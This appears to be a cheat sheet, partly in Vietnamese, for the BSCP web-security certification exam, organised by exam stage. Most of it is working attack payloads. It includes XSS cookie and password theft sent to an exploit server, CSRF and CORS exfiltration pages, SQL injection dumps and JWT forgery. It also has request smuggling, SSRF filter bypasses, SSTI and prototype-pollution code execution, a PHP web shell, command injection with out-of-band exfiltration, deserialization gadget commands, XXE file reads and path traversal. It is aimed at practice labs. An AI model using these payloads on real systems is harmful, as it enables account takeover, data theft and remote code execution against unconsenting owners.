# BSCP - Methodology by Stage

> Exam: 2 apps x 3 stages, 4 hours total
> Mỗi app: Stage 1 (user access) -> Stage 2 (admin) -> Stage 3 (read secret)
> File này chia theo stage, thấy feature gì -> inject đâu -> payload

---

## STAGE 1: Get User Access

> Mục tiêu: Lấy được account user (thường là `carlos` hoặc `wiener` escalate)
> Thời gian nên dành: ~30-40 phút / app

---

### 1.1 XSS -> Steal Cookie / Credentials

**Tìm feature:** Search box, comment, blog post, feedback form, URL param reflect

**Cách test:**
1. Inject `<script>alert(1)</script>` vào mọi input reflect
2. Check DOM sources: `document.write`, `innerHTML`, `eval`, `location`
3. Check AngularJS: tìm `ng-app` trong HTML -> `{{$eval.constructor('alert(1)')()}}`

**Steal cookie (deliver to victim):**
```html
<script>fetch('https://EXPLOIT-SERVER/steal?c='+document.cookie)</script>
```

**Steal password (auto-fill):**
```html
<input name=username id=username>
<input type=password name=password onchange="fetch('https://EXPLOIT-SERVER/steal?p='+username.value+':'+this.value)">
```

**Tags blocked? Try:**
```html
<svg><animatetransform onbegin=alert(1) attributeName=x>
<body onresize=print()>  (via iframe)
<xss id=x onfocus=alert(1) tabindex=1>  (custom tag)
```

**DOM XSS:**
```
"><script>alert(1)</script>              (document.write)
<img src=1 onerror=alert(1)>             (innerHTML)
javascript:alert(1)                       (location/href)
```

---

### 1.2 CSRF -> Change Victim Email -> Password Reset

**Tìm feature:** Email change form, any state-changing form without proper CSRF

**Cách test:**
1. Check form có CSRF token không
2. Thử remove token, method switch (POST->GET), reuse token

**No CSRF protection:**
```html
<form method="POST" action="https://TARGET/my-account/change-email">
    <input type="hidden" name="email" value="attacker@evil.com">
</form>
<script>document.forms[0].submit();</script>
```

**Token present but weak:**
- Remove token param entirely -> submit
- Switch to GET: `document.location='https://TARGET/my-account/change-email?email=attacker@evil.com'`
- Use your own valid token (not tied to session)

**SameSite=Lax bypass:**
```html
<script>
document.location='https://TARGET/my-account/change-email?email=attacker@evil.com&_method=POST';
</script>
```

**SameSite=Strict bypass (client-side redirect):**
```html
<script>
document.location='https://TARGET/post/comment/confirmation?postId=1/../../my-account/change-email?email=attacker@evil.com%26submit=1';
</script>
```

**After email changed:** dùng Forgot Password -> reset password cho email mới -> login as victim

---

### 1.3 Authentication Bypass

**Tìm feature:** Login page, 2FA page, stay-logged-in, password reset

**Cách test theo thứ tự:**

**Username enumeration:**
1. Bruteforce username -> check response length/text khác nhau
2. Subtly different response (trailing space, different wording)
3. Response timing: gửi password rất dài + valid username -> slower

**2FA bypass:**
1. Login as victim -> skip 2FA page -> navigate `/my-account`
2. Login as attacker -> get valid 2FA page -> change cookie to victim -> brute 0000-9999

**Password reset logic:**
1. Gửi reset request -> change `username=carlos` trong POST body
2. Thêm `X-Forwarded-Host: EXPLOIT-SERVER` -> reset link gửi qua attacker

**Stay-logged-in cookie:**
1. Decode base64 -> `carlos:md5(password)`
2. Brute-force md5 hash offline
3. Hoặc XSS steal cookie -> crack

**Brute-force bypass IP lock:**
- Thêm `X-Forwarded-For: 1.1.1.{N}` mỗi request
- Alternate valid login giữa các attempt

---

### 1.4 OAuth Flaws

**Tìm feature:** "Login with social media", OAuth redirect flow

**Cách test:**

**Implicit flow - change user:**
1. Login via OAuth -> intercept POST to target server
2. Change user param (email/username) to victim

**No state param (CSRF):**
1. Start OAuth link flow -> intercept redirect with code
2. Drop request -> deliver URL to victim
3. Victim's account linked to attacker's OAuth

**Redirect URI manipulation:**
```
redirect_uri=https://TARGET/oauth?redirect=https://ATTACKER
redirect_uri=https://TARGET/..%2f..%2foauth?redirect=https://ATTACKER
```

**Recon:** `/.well-known/oauth-authorization-server` , `/.well-known/openid-configuration`

---

### 1.5 CORS -> Steal API Key / Data

**Tìm feature:** `/accountDetails` API, any endpoint returning sensitive data

**Cách test:**
1. Request `/accountDetails` với `Origin: https://attacker.com`
2. Check `Access-Control-Allow-Origin` reflect?

**Origin reflected:**
```html
<script>
var req = new XMLHttpRequest();
req.onload = function() { location='/log?key='+this.responseText; };
req.open('get','https://TARGET/accountDetails',true);
req.withCredentials = true;
req.send();
</script>
```

**Null origin trusted:**
```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="
<script>
var r=new XMLHttpRequest();
r.onload=function(){location='https://EXPLOIT/log?d='+this.responseText};
r.open('get','https://TARGET/accountDetails',true);
r.withCredentials=true;
r.send();
</script>"></iframe>
```

---

### 1.6 WebSocket Hijacking

**Tìm feature:** Live chat

**Cách test:**
1. Check WebSocket handshake trong Burp
2. Không check Origin -> CSWSH

```html
<script>
var ws = new WebSocket('wss://TARGET/chat');
ws.onopen = function() { ws.send("READY"); };
ws.onmessage = function(event) {
    fetch('https://EXPLOIT/?d='+btoa(event.data));
};
</script>
```

---

### 1.7 Clickjacking

**Tìm feature:** Account page có action button (delete, change email, etc.)

**Cách test:** Check `X-Frame-Options` / `frame-ancestors` CSP

```html
<style>
iframe{position:relative;width:1400px;height:800px;opacity:0.0001;z-index:2}
div{position:absolute;top:500px;left:100px;z-index:1}
</style>
<div>Click me</div>
<iframe src="https://TARGET/my-account?email=attacker@evil.com"></iframe>
```

**Frame buster bypass:** thêm `sandbox="allow-forms"`

---

## STAGE 2: Escalate to Admin

> Mục tiêu: Truy cập admin panel, delete user carlos, hoặc lấy admin credentials
> Thời gian nên dành: ~30-40 phút / app

---

### 2.1 SQL Injection -> Admin Credentials

**Tìm feature:** Category filter, search, product ID, TrackingId cookie

**UNION attack (category param):**
```
' ORDER BY 3--                                          # find column count
' UNION SELECT NULL,NULL,NULL--                         # confirm
' UNION SELECT TABLE_NAME,NULL FROM information_schema.tables--  # list tables
' UNION SELECT COLUMN_NAME,NULL FROM information_schema.columns WHERE table_name='users_xxx'--
' UNION SELECT username,password FROM users_xxx--       # dump creds
```

**Blind SQLi (TrackingId cookie):**
```
xyz' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1)='a'--
```

**Visible error (PostgreSQL):**
```
' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
```

-> Login as administrator

---

### 2.2 Access Control Bypass

**Tìm feature:** Admin panel (403/blocked), user role, API endpoints

**Direct access:**
- Check `/robots.txt` -> admin path
- Check JS source code cho hidden admin URL
- Try `/admin`, `/admin-panel`, `/administrator-panel`

**Header bypass:**
```http
X-Original-URL: /admin
X-Rewrite-URL: /admin
```

**Method interchange:**
- POST `/admin/delete?username=carlos` -> 403
- GET `/admin/delete?username=carlos` -> 200

**IDOR:**
- `/my-account?id=administrator`
- API: `/api/user/1` -> `/api/user/2`
- GUIDs leak trong response/comments/blog

**Multi-step bypass:**
- Admin action cần 3 step -> skip to step 3 (final confirmation)

**Referer-based:**
- Thêm `Referer: https://TARGET/admin` vào request

---

### 2.3 SSRF -> Access Internal Admin

**Tìm feature:** Stock check, URL fetch, webhook, PDF generator

**Basic:**
```
stockApi=http://localhost/admin
stockApi=http://localhost/admin/delete?username=carlos
```

**Internal network:**
```
stockApi=http://192.168.0.1:8080/admin       # scan 1-255
```

**Blacklist bypass:**
```
http://127.1/              # short form
http://127.0.0.1/%2561dmin # double URL encode 'a'
http://2130706433/         # decimal IP
http://017700000001/       # octal IP
http://127.0.0.1.nip.io/  # DNS rebinding
```

**Whitelist bypass:**
```
http://localhost%23@stock.target.net/admin    # fragment
http://localhost%2523@stock.target.net/admin  # double encode
```

**Open redirect chain:**
```
stockApi=/product/nextProduct?currentProductId=1%26path=http://192.168.0.12:8080/admin
```

**Blind SSRF (Shellshock):**
```
User-Agent: () { :; }; /usr/bin/nslookup $(whoami).COLLABORATOR
Referer: http://192.168.0.X:8080
```

---

### 2.4 Host Header Attacks

**Tìm feature:** Password reset, admin panel (localhost only)

**Password reset poisoning:**
```http
POST /forgot-password HTTP/1.1
Host: EXPLOIT-SERVER

username=administrator
```
-> Admin reset link gửi tới exploit server -> lấy token -> reset password

**Host header variations:**
```http
Host: EXPLOIT-SERVER
X-Forwarded-Host: EXPLOIT-SERVER
Host: TARGET
Host: EXPLOIT-SERVER             # duplicate
GET https://TARGET/ HTTP/1.1
Host: EXPLOIT-SERVER              # absolute URL
```

**Admin access via Host:**
```http
Host: localhost                   # admin panel check Host
```

**Routing-based SSRF:**
```http
GET /admin HTTP/1.1
Host: 192.168.0.1                # route to internal
```

---

### 2.5 JWT Attacks -> Forge Admin Token

**Tìm feature:** JWT cookie (starts with `eyJ`)

**Test sequence:**
1. **Unverified signature:** change `"sub":"administrator"`, keep signature
2. **None algorithm:** set `"alg":"none"`, empty signature `eyJ...eyJ..`
3. **Weak secret:** `hashcat -a 0 -m 16500 <jwt> jwt.secrets.list`
4. **JWK injection:** embed own RSA public key in header
5. **JKU injection:** point to attacker-hosted JWKS
6. **KID traversal:** `"kid":"../../../dev/null"` + sign with empty string
7. **Algorithm confusion:** RS256->HS256, sign with server public key

---

### 2.6 NoSQL Injection -> Auth Bypass

**Tìm feature:** Login form with JSON body, MongoDB backend

**Auth bypass:**
```json
{"username":{"$regex":"admin.*"},"password":{"$ne":""}}
```

**Extract admin password:**
```
admin' && this.password.length==20 || 'a'=='b
admin' && this.password[0]=='a' || 'a'=='b
```
-> Script character by character -> login

---

### 2.7 Business Logic -> Privilege Escalation

**Tìm feature:** Role selector, email domain check, multi-step process

**Common patterns:**
- Register -> change email to `@dontwannacry.com` -> admin access
- Skip role selector -> default role = admin
- Remove `current_password` param -> change admin password
- Email truncation (255 chars) -> admin domain

---

### 2.8 Web Cache Poisoning -> XSS on Admin

**Tìm feature:** `X-Cache` header, static resources

**Unkeyed header inject JS:**
```http
GET / HTTP/1.1
X-Forwarded-Host: EXPLOIT-SERVER
```
-> Response loads `<script src="https://EXPLOIT-SERVER/resources/js/analytics.js">`
-> Host malicious JS -> admin visits cached page -> XSS

**Multiple headers:**
```http
X-Forwarded-Host: EXPLOIT-SERVER
X-Forwarded-Scheme: http
```
-> Force redirect to attacker -> poison cache

---

### 2.9 HTTP Request Smuggling -> Hijack Admin Request

**Tìm feature:** Reverse proxy + backend (check via timing/response)

**CL.TE (front-end CL, back-end TE):**
```http
POST / HTTP/1.1
Content-Length: 130
Transfer-Encoding: chunked

0

POST /admin HTTP/1.1
Host: localhost
Content-Length: 15

x=1
```
-> Next admin request gets routed to smuggled `/admin`

**TE.CL:**
```http
POST / HTTP/1.1
Content-Length: 4
Transfer-Encoding: chunked

5e
POST /admin HTTP/1.1
Host: localhost
Content-Length: 15

x=1
0


```

**Steal admin request (cookie):**
- Smuggle POST to comment endpoint
- Admin request body (with cookie) appended to comment
- Read comment -> get admin session

---

## STAGE 3: Read /home/carlos/secret

> Mục tiêu: Đọc file `/home/carlos/secret` trên server
> Thường cần RCE hoặc file read vulnerability
> Thời gian nên dành: ~20-30 phút / app

---

### 3.1 SSTI -> RCE

**Tìm feature:** Any user input rendered by template engine (name, message, email, 404 page)

**Detect:**
```
{{7*7}}    -> 49? -> Jinja2 or Twig
${7*7}     -> 49? -> FreeMarker
<%= 7*7 %> -> 49? -> ERB
```

**Exploit by engine:**

ERB:
```ruby
<%= File.open('/home/carlos/secret').read %>
```

Jinja2:
```python
{{__import__('os').popen('cat /home/carlos/secret').read()}}
```

FreeMarker:
```
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("cat /home/carlos/secret")}
```

Handlebars:
```
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').execSync('cat /home/carlos/secret');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

---

### 3.2 File Upload -> Web Shell

**Tìm feature:** Avatar upload, file attachment, document upload

**Basic shell:**
```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

**Bypass sequence:**
1. Upload `.php` directly
2. Blocked? Change `Content-Type: image/jpeg`
3. Still blocked? Path traversal filename: `%2e%2e%2fshell.php`
4. Extension blacklist? Upload `.htaccess` first: `AddType application/x-httpd-php .rce`
5. Extension whitelist? Null byte: `shell.php%00.jpg`
6. Content check? Polyglot: `exiftool -Comment="<?php echo file_get_contents('/home/carlos/secret'); ?>" img.jpg -o polyglot.php`

-> Access uploaded file URL to trigger

---

### 3.3 OS Command Injection

**Tìm feature:** Any server-side processing (feedback, email, DNS lookup, ping, file conversion)

**Inject points:** email param, filename param, any param sent to shell

**Basic:**
```
;cat /home/carlos/secret;
|cat /home/carlos/secret
||cat /home/carlos/secret||
`cat /home/carlos/secret`
$(cat /home/carlos/secret)
```

**Blind - redirect output:**
```
||cat /home/carlos/secret > /var/www/images/output.txt||
```
-> Access `/image?filename=output.txt`

**Blind - OOB:**
```
||nslookup `cat /home/carlos/secret`.COLLABORATOR||
```

**Blind - time-based confirm:**
```
||ping -c 10 127.0.0.1||
```

---

### 3.4 Insecure Deserialization -> RCE

**Tìm feature:** Cookie chứa serialized data (PHP `O:`, Java `rO0`/`ac ed`)

**PHP deserialization:**
1. Decode session cookie -> PHP serialized object
2. Find gadget: backup files (`file~`), source code leak
3. Modify object -> trigger `__destruct()` / `__wakeup()` -> file read/delete

**PHP gadget chain (phpggc):**
```bash
php phpggc Symfony/RCE4 exec 'cat /home/carlos/secret' | base64
```
-> Sign with `SECRET_KEY` (from phpinfo/debug page) -> inject as cookie

**Java deserialization (ysoserial):**
```bash
java -jar ysoserial.jar CommonsCollections4 'cat /home/carlos/secret' | base64
```
-> Replace session cookie

**Ruby deserialization:**
- Universal deserialisation gadget for Ruby 2.x
- Look for `Marshal.load` usage

---

### 3.5 XXE -> File Read

**Tìm feature:** XML input (stock check, SOAP, file upload accepting SVG/XML)

**Direct file read:**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///home/carlos/secret">]>
<stockCheck><productId>&xxe;</productId></stockCheck>
```

**Blind XXE (OOB exfil):**
```xml
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://EXPLOIT-SERVER/dtd">%xxe;]>
```

DTD on exploit server:
```xml
<!ENTITY % file SYSTEM "file:///home/carlos/secret">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://EXPLOIT-SERVER/?x=%file;'>">
%eval; %exfil;
```

**Error-based XXE:**
```xml
<!ENTITY % file SYSTEM "file:///home/carlos/secret">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval; %error;
```

**XInclude (no DOCTYPE control):**
```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///home/carlos/secret"/></foo>
```

**SVG upload:**
```xml
<?xml version="1.0"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///home/carlos/secret">]>
<svg xmlns="http://www.w3.org/2000/svg"><text x="0" y="16">&xxe;</text></svg>
```

---

### 3.6 Path Traversal -> File Read

**Tìm feature:** Image loading (`/image?filename=`), file download, document viewer

**Payload sequence:**
```
../../../home/carlos/secret
/home/carlos/secret
....//....//....//home/carlos/secret
%252e%252e%252f%252e%252e%252fhome/carlos/secret
/var/www/images/../../../home/carlos/secret
../../../home/carlos/secret%00.jpg
```

---

### 3.7 SSRF + XXE / File Read Chain

**Tìm feature:** Stock check, URL fetcher + internal service

**SSRF to internal file reader:**
```
stockApi=http://192.168.0.X:8080/files?path=/home/carlos/secret
```

**SSRF + XXE combo:**
1. SSRF access internal XML service
2. Inject XXE into that internal request

---

### 3.8 Prototype Pollution -> RCE

**Tìm feature:** JSON input, Node.js backend, `__proto__` accepted

**Detect:**
```json
{"__proto__":{"json spaces":10}}
```
-> Response JSON indented = polluted

**RCE via child_process:**
```json
{"__proto__":{"execArgv":["--eval=require('child_process').execSync('cat /home/carlos/secret')"]}}
```

**RCE via NODE_OPTIONS:**
```json
{"__proto__":{"shell":"node","NODE_OPTIONS":"--require=/proc/self/cmdline","argv0":"console.log(require('child_process').execSync('cat /home/carlos/secret').toString())//"}}
```

-> Trigger by causing server to spawn child process (e.g., job queue, worker)

---

## Exam Checklist (per app)

### Recon (5 min)
- [ ] Sitemap: crawl with Burp
- [ ] Check `robots.txt`, `sitemap.xml`
- [ ] Check page source + JS files for hidden paths
- [ ] Identify all input points (params, headers, cookies)
- [ ] Check tech stack (response headers, error messages)
- [ ] Note all features: search, login, upload, comment, API, etc.

### Stage 1 Checklist
- [ ] Test reflected XSS on all inputs
- [ ] Test stored XSS on comments/feedback
- [ ] Test DOM XSS (check JS sources/sinks)
- [ ] Test CSRF on email change / account actions
- [ ] Test clickjacking (X-Frame-Options?)
- [ ] Test auth bypass (2FA skip, username enum)
- [ ] Test OAuth flaws (redirect_uri, state param)
- [ ] Test CORS (check origin reflection)
- [ ] Test WebSocket hijacking (if chat exists)

### Stage 2 Checklist
- [ ] Test SQLi on all params + cookies
- [ ] Test access control (direct URL, headers, methods)
- [ ] Test SSRF on URL-accepting features
- [ ] Test Host header on password reset
- [ ] Test JWT (if cookie starts with eyJ)
- [ ] Test NoSQL injection (if JSON login)
- [ ] Test business logic (role, email, workflow)
- [ ] Test cache poisoning (X-Cache header?)
- [ ] Test HTTP smuggling (proxy setup?)

### Stage 3 Checklist
- [ ] Test SSTI on all rendered inputs
- [ ] Test file upload -> web shell
- [ ] Test OS command injection
- [ ] Test deserialization (check cookie format)
- [ ] Test XXE on XML inputs
- [ ] Test path traversal on file params
- [ ] Test prototype pollution (JSON + Node.js?)
- [ ] Test SSRF file read chain
